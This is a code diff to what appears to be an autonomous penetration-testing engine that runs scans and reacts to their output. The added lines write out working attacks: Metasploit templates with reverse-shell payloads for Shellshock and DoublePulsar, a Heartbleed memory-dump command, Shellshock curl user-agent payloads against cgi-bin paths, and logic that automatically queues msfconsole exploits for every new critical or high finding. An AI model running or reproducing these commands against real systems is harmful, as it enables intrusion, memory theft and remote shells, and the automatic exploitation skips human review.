@@ -887,6 +887,8 @@ _MSF_AUTO_CMDS = [
      "use exploit/unix/webapp/drupal_drupalgeddon2\nset RHOSTS {rhost}\nset PAYLOAD php/reverse_php\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
     (r'log4shell|cve-2021-44228',
      "use exploit/multi/misc/log4shell_header_injection\nset RHOSTS {rhost}\nset PAYLOAD java/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'shellshock|cve-2014-6271',
+     "use exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS {rhost}\nset PAYLOAD linux/x86/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
     (r'distcc.*rce|cve-2004-2687',
      "use exploit/unix/misc/distcc_exec\nset RHOSTS {rhost}\nset PAYLOAD cmd/unix/reverse_netcat\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
     (r'unrealircd.*backdoor',
@@ -4866,16 +4868,21 @@ class AutonomousEngine:
         existing_findings = project.get("findings", [])
         seen_titles = {f.get("title", "") for f in existing_findings}
         new_vuln_count = 0
+        new_exploitable = []
         now_iso = datetime.now().isoformat()
+        vars_dict = {"lhost": self.lhost, "lport": self.lport}
         for f in parsed.get("findings", []):
             title = f.get("title", "")
             if title and title not in seen_titles:
                 f["created_at"] = now_iso
                 _enrich_finding_cvss(f)
                 _auto_mitre_tag(f)
+                _attach_msf_command(f, target, vars_dict)
                 existing_findings.append(f)
                 seen_titles.add(title)
                 new_vuln_count += 1
+                if f.get("exploit_cmd") and f.get("severity") in ("critical", "high"):
+                    new_exploitable.append(f)
         project["findings"] = existing_findings
 
         write_project(project)
@@ -4884,6 +4891,20 @@ class AutonomousEngine:
         if new_vuln_count:
             self.stats["findings_count"] += new_vuln_count
             self._log(f"FOUND [{target}] +{new_vuln_count} vulnerabilidad(es) detectada(s)")
+
+        # Auto-queue exploits for new exploitable findings
+        for f in new_exploitable:
+            exploit_cmd = f.get("exploit_cmd", "")
+            title = f.get("title", "")
+            key = f"AutoExploit:{re.sub(r'[^a-z0-9]', '_', title.lower())[:35]}"
+            if "use exploit/" in exploit_cmd or "use auxiliary/" in exploit_cmd:
+                safe_cmd = exploit_cmd.replace("'", '"')
+                if self._enqueue(4, key, f"msfconsole -q -x '{safe_cmd}; exit' 2>/dev/null", target):
+                    self._log(f"EXPLOIT [{target}] Auto-enqueuing: {title[:60]}")
+            elif any(t in exploit_cmd for t in ("redis-cli", "nc -w", "ftp -n")):
+                if self._enqueue(4, key, exploit_cmd, target):
+                    self._log(f"EXPLOIT [{target}] Auto-enqueuing (direct): {title[:60]}")
+
         return parsed, new_creds
 
     def _update_attack_path(self, target, open_ports):
@@ -5885,6 +5906,35 @@ class AutonomousEngine:
                     self._acl_abuse_chain(target, self._domain, _u, _p, _ace_type, _victim)
                 break
 
+        # Heartbleed → dump memory via MSF auxiliary
+        if re.search(r'ssl-heartbleed|heartbleed', output, re.I) and re.search(r'VULNERABLE', output, re.I):
+            self._log(f"REACT [{target}] Heartbleed → dumping memory")
+            self._enqueue(1, f"Heartbleed-Dump:{target}",
+                f"msfconsole -q -x 'use auxiliary/scanner/ssl/openssl_heartbleed; "
+                f"set RHOSTS {target}; set ACTION DUMP; set VERBOSE false; run; exit' 2>/dev/null | "
+                f"grep -A5 'Heartbeat data\\|DUMP\\|memory' | head -30 || true", target)
+
+        # Shellshock → direct curl RCE + MSF
+        if re.search(r'http-shellshock|shellshock', output, re.I) and re.search(r'VULNERABLE', output, re.I):
+            self._log(f"REACT [{target}] Shellshock → RCE via curl + MSF")
+            _ports = {p for p, s, v in self._known_services.get(target, [])}
+            _port = next(iter({80, 443, 8080} & _ports), 80)
+            self._enqueue(1, f"Shellshock-RCE:{target}",
+                f"curl -s --max-time 10 -A '() {{:;}}; echo; echo SHELLSHOCK_RCE; id' "
+                f"http://{target}:{_port}/cgi-bin/admin.cgi 2>/dev/null; "
+                f"curl -s --max-time 10 -A '() {{:;}}; echo; id' "
+                f"http://{target}:{_port}/cgi-bin/status 2>/dev/null | head -5; "
+                f"curl -s --max-time 10 -A '() {{:;}}; echo; id' "
+                f"http://{target}:{_port}/cgi-bin/test-cgi 2>/dev/null | head -5 || true", target)
+
+        # Double Pulsar (SMB backdoor) → direct exploit
+        if re.search(r'double.pulsar|smb-double-pulsar|DOUBLEPULSAR', output, re.I):
+            self._log(f"REACT [{target}] DoublePulsar → MSF")
+            self._enqueue(0, f"DoublePulsar:{target}",
+                f"msfconsole -q -x 'use exploit/windows/smb/smb_doublepulsar_rce; "
+                f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
+                f"set PAYLOAD windows/x64/meterpreter/reverse_tcp; run; sleep 20; exit' 2>/dev/null", target)
+
         # ── SSRF cloud metadata detected → extract credentials ───────────────
         if re.search(r'SSRF_CLOUD_METADATA|ami-id|instance-id|iam.*security-credentials|SSRF_CANDIDATE', output, re.I):
             _param_m = re.search(r'SSRF_CANDIDATE:\s*param=(\S+)', output)
@@ -6416,10 +6466,15 @@ def autopilot_start(project_id):
         targets_raw = [t.strip() for t in re.split(r'[\n,]+', targets_raw) if t.strip()]
     if not targets_raw:
         return jsonify({"error": "No targets defined"}), 400
+    force = data.get("force", False)
     with AUTOPILOT_LOCK:
         eng = AUTOPILOT_ENGINES.get(project_id)
         if eng and eng._running:
-            return jsonify({"error": "Already running"}), 409
+            # Allow force-restart if explicitly requested or queue is empty (engine stalled)
+            queue_empty = eng._job_queue.empty() and not eng._pivot_targets
+            if not force and not queue_empty:
+                return jsonify({"error": "Already running"}), 409
+            eng.stop()
         engine = AutonomousEngine(project_id, targets_raw, mode,
                                   data.get("ollama_model", "llama3"),
                                   int(data.get("living_interval", 300)),
